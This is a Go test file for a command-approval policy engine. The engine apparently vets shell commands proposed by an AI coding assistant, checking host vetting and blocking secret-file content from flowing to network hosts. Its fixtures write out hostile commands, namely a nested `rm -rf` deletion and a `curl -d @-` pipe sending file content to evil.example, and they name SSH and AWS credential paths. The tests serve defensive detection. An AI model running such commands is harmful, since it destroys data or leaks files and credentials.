package effectpolicy

import (
	"strings"
	"testing"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/cmddesc"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/effectgraph"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/evalcontract"
)

func TestHostVetted(t *testing.T) {
	ctx := PolicyContext{VettedHosts: []string{"example.com", ".internal.example", "", "Upper.Example"}}
	cases := map[string]bool{
		"example.com":        true,
		"api.example.com":    true,
		"EXAMPLE.com":        true,
		"notexample.com":     false,
		"example.com.evil":   false,
		"internal.example":   false, // leading-dot entry: subdomains only
		"a.internal.example": true,
		"xinternal.example":  false,
		"upper.example":      true,
		"":                   false,
		"evil.example":       false,
	}
	for host, want := range cases {
		if got := ctx.HostVetted(host); got != want {
			t.Errorf("HostVetted(%q) = %v, want %v", host, got, want)
		}
	}
	if (PolicyContext{}).HostVetted("example.com") {
		t.Error("nil VettedHosts vets a host")
	}
}

func TestNetworkAccessPolicy(t *testing.T) {
	ctx := PolicyContext{VettedHosts: []string{"example.com"}}
	net := func(host string, dir cmddesc.NetDirection, dynamic bool) cmddesc.Effect {
		return cmddesc.Effect{Kind: cmddesc.EffectNet, Host: host, Direction: dir, Dynamic: dynamic}
	}
	cases := []struct {
		name    string
		e       cmddesc.Effect
		verdict FindingVerdict
	}{
		{"inbound vetted", net("example.com", cmddesc.NetInbound, false), Permitted},
		{"inbound subdomain", net("a.example.com", cmddesc.NetInbound, false), Permitted},
		{"outbound vetted", net("example.com", cmddesc.NetOutbound, false), Unknown},
		{"inbound unvetted", net("evil.example", cmddesc.NetInbound, false), Unknown},
		{"dynamic", net("$U", cmddesc.NetInbound, true), Unknown},
	}
	for _, tc := range cases {
		f, applies := NetworkAccess{}.Judge(tc.e, ctx)
		if !applies || f.Verdict != tc.verdict {
			t.Errorf("%s: applies=%v verdict=%s (%s), want %s", tc.name, applies, f.Verdict, f.Reason, tc.verdict)
		}
		if f.Verdict == Forbidden {
			t.Errorf("%s: network-access must never forbid", tc.name)
		}
	}
	if _, applies := (NetworkAccess{}).Judge(cmddesc.Effect{Kind: cmddesc.EffectPath, Path: "x"}, ctx); applies {
		t.Error("applied to a path effect")
	}
}

// handGraph builds a graph by hand: src -(flow)-> mid -(flow)-> sink, with
// the effects and marks given, so the graph policy is tested without parsing
// or interpreting any command.
func handGraph(srcEffects, sinkEffects []cmddesc.Effect, midMark effectgraph.Mark) *effectgraph.Graph {
	return &effectgraph.Graph{
		Nodes: []effectgraph.Node{
			{ID: "n0", Kind: effectgraph.NodeCommand, Label: "src", Effects: srcEffects, Mark: effectgraph.MarkPermitted},
			{ID: "n1", Kind: effectgraph.NodeCommand, Label: "mid", Effects: []cmddesc.Effect{{Kind: cmddesc.EffectStdio, Stream: cmddesc.StreamStdin}, {Kind: cmddesc.EffectStdio, Stream: cmddesc.StreamStdout}}, Mark: midMark},
			{ID: "n2", Kind: effectgraph.NodeCommand, Label: "sink", Effects: sinkEffects, Mark: effectgraph.MarkPermitted},
			{ID: "n3", Kind: effectgraph.NodeFile, Label: "f"},
		},
		Edges: []effectgraph.Edge{
			{From: "n0", To: "n1", Kind: effectgraph.EdgeFlow},
			{From: "n1", To: "n2", Kind: effectgraph.EdgeFlow},
			{From: "n0", To: "n3", Kind: effectgraph.EdgeReads},
		},
	}
}

func TestNoContentFlowToUnvettedNetworkHandBuilt(t *testing.T) {
	read := func(p string) cmddesc.Effect {
		return cmddesc.Effect{Kind: cmddesc.EffectPath, Path: p, Access: cmddesc.AccessRead}
	}
	stdin := cmddesc.Effect{Kind: cmddesc.EffectStdio, Stream: cmddesc.StreamStdin}
	out := func(host string) cmddesc.Effect {
		return cmddesc.Effect{Kind: cmddesc.EffectNet, Host: host, Direction: cmddesc.NetOutbound, Method: "POST"}
	}
	in := cmddesc.Effect{Kind: cmddesc.EffectNet, Host: "example.com", Direction: cmddesc.NetInbound, Method: "GET"}
	vetted := PolicyContext{VettedHosts: []string{"example.com"}}
	p := NoContentFlowToUnvettedNetwork{}

	cases := []struct {
		name    string
		g       *effectgraph.Graph
		ctx     PolicyContext
		verdict FindingVerdict
		reason  string
		none    bool
	}{
		{"secret upstream", handGraph([]cmddesc.Effect{read("/home/u/.ssh/id_rsa")}, []cmddesc.Effect{stdin, out("evil.example")}, effectgraph.MarkPermitted), vetted, Forbidden, "secret content flows to network", false},
		{"secret on sink itself", handGraph(nil, []cmddesc.Effect{read("/home/u/.ssh/id_rsa"), out("example.com")}, effectgraph.MarkPermitted), vetted, Forbidden, "on node n2", false},
		{"secret upstream outranks vetted", handGraph([]cmddesc.Effect{read("/home/u/.aws/credentials")}, []cmddesc.Effect{stdin, out("example.com")}, effectgraph.MarkPermitted), vetted, Forbidden, "secret", false},
		{"insufficient upstream", handGraph([]cmddesc.Effect{read("a")}, []cmddesc.Effect{stdin, out("example.com")}, effectgraph.MarkInsufficient), vetted, Unknown, "upstream node n1 (mid) is insufficient", false},
		{"vetted needs consent", handGraph([]cmddesc.Effect{read("a")}, []cmddesc.Effect{stdin, out("example.com")}, effectgraph.MarkPermitted), vetted, Unknown, "requires consent", false},
		{"unvetted", handGraph([]cmddesc.Effect{read("a")}, []cmddesc.Effect{stdin, out("evil.example")}, effectgraph.MarkPermitted), vetted, Unknown, "content flows to unvetted host evil.example", false},
		{"dynamic host is unvetted", handGraph([]cmddesc.Effect{read("a")}, []cmddesc.Effect{stdin, {Kind: cmddesc.EffectNet, Host: "$U", Direction: cmddesc.NetOutbound, Dynamic: true}}, effectgraph.MarkPermitted), vetted, Unknown, "unvetted host $U", false},
		{"dynamic upstream read is not a secret", handGraph([]cmddesc.Effect{{Kind: cmddesc.EffectPath, Path: "~/.ssh/id_rsa", Access: cmddesc.AccessRead, Dynamic: true}}, []cmddesc.Effect{stdin, out("evil.example")}, effectgraph.MarkPermitted), vetted, Unknown, "unvetted", false},
		{"inbound sink is not a sink", handGraph([]cmddesc.Effect{read("/home/u/.ssh/id_rsa")}, []cmddesc.Effect{stdin, in}, effectgraph.MarkPermitted), vetted, Unknown, "", true},
		{"literal-only upload gets no finding", &effectgraph.Graph{Nodes: []effectgraph.Node{{ID: "n0", Kind: effectgraph.NodeCommand, Effects: []cmddesc.Effect{out("evil.example")}}}}, vetted, Unknown, "", true},
		{"stdin with no upstream is content", &effectgraph.Graph{Nodes: []effectgraph.Node{{ID: "n0", Kind: effectgraph.NodeCommand, Effects: []cmddesc.Effect{stdin, out("evil.example")}}}}, vetted, Unknown, "unvetted", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings := p.JudgeGraph(tc.g, tc.ctx)
			if tc.none {
				if len(findings) != 0 {
					t.Fatalf("findings = %+v, want none", findings)
				}
				return
			}
			if len(findings) != 1 {
				t.Fatalf("findings = %+v, want one", findings)
			}
			f := findings[0]
			sink := tc.g.Nodes[len(tc.g.Nodes)-1]
			if sink.Kind != effectgraph.NodeCommand {
				sink = tc.g.Nodes[2]
			}
			if f.NodeID != sink.ID || f.Verdict != tc.verdict || !strings.Contains(f.Reason, tc.reason) {
				t.Errorf("finding = %+v, want node %s %s containing %q", f, sink.ID, tc.verdict, tc.reason)
			}
		})
	}
}

// TestApplyGraphFinding: fold precedence and the recorded text.
func TestApplyGraphFinding(t *testing.T) {
	n := &effectgraph.Node{Mark: effectgraph.MarkPermitted}
	applyGraphFinding(n, "p", GraphFinding{Verdict: Permitted, Reason: "ok"})
	if n.Mark != effectgraph.MarkPermitted || len(n.GraphFindings) != 1 {
		t.Errorf("permitted finding changed mark: %+v", n)
	}
	applyGraphFinding(n, "p", GraphFinding{Verdict: Unknown, Reason: "hm"})
	if n.Mark != effectgraph.MarkInsufficient || !strings.HasPrefix(n.MarkReason, "p: unknown (hm)") {
		t.Errorf("unknown finding: %+v", n)
	}
	n.Mark, n.MarkReason = effectgraph.MarkInsufficient, "builder reason"
	applyGraphFinding(n, "p", GraphFinding{Verdict: Unknown, Reason: "again"})
	if n.MarkReason != "builder reason" {
		t.Errorf("unknown finding replaced an existing insufficient reason: %q", n.MarkReason)
	}
	applyGraphFinding(n, "p", GraphFinding{Verdict: Forbidden, Reason: "bad"})
	if n.Mark != effectgraph.MarkForbidden || n.MarkReason != "p: forbidden (bad)" {
		t.Errorf("forbidden finding: %+v", n)
	}
	if len(n.GraphFindings) != 4 {
		t.Errorf("findings recorded = %d, want 4", len(n.GraphFindings))
	}
}

// TestNestedReasonNamesScope: a Reject inside `bash -c` says so in the reason.
func TestNestedReasonNamesScope(t *testing.T) {
	root, _ := fixture(t)
	resp := Evaluate(evalcontract.Request{Command: `bash -c 'sh -c "rm -rf /nix/store/x"'`, CWD: root, ProjectRoot: root}, cmddesc.DefaultRegistry(), DefaultPolicies(), DefaultGraphPolicies())
	if resp.Decision != evalcontract.Reject {
		t.Fatalf("decision = %s (%s)", resp.Decision, resp.Reason)
	}
	if !strings.Contains(resp.Reason, "(bash -c > sh -c: rm -rf /nix/store/x)") {
		t.Errorf("reason = %q", resp.Reason)
	}
}

// TestGraphFindingVisibleInMermaid: the flow finding is rendered even though
// the node-level mark already carries a reason.
func TestGraphFindingVisibleInMermaid(t *testing.T) {
	root, _ := fixture(t)
	resp := Evaluate(evalcontract.Request{Command: "cat README.md | curl -d @- https://evil.example", CWD: root, ProjectRoot: root}, cmddesc.DefaultRegistry(), DefaultPolicies(), DefaultGraphPolicies())
	out := effectgraph.Mermaid(resp.Interpreted)
	if !strings.Contains(out, "graph: no-content-flow-to-unvetted-network: unknown") || !strings.Contains(out, "flow: stdout-#gt;stdin") {
		t.Errorf("mermaid lacks the flow finding or edge:\n%s", out)
	}
}
